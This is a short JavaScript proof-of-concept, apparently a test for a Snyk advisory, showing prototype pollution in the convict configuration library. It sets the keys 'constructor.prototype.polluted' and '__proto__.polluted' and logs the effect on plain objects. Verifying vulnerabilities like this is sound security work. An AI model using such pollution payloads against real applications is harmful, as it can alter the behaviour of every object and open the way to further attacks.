// //https://snyk.io/vuln/SNYK-JS-CONVICT-1062508
// test("prototype pollution in node-dig", () => {
  const convict = require("convict");
  let obj = {};
  const config = convict(obj);

console.log({}.polluted);
config.set("constructor.prototype.polluted", "yes");
//  config.set("__proto__.polluted", "yes");
console.log({}.polluted);
// });
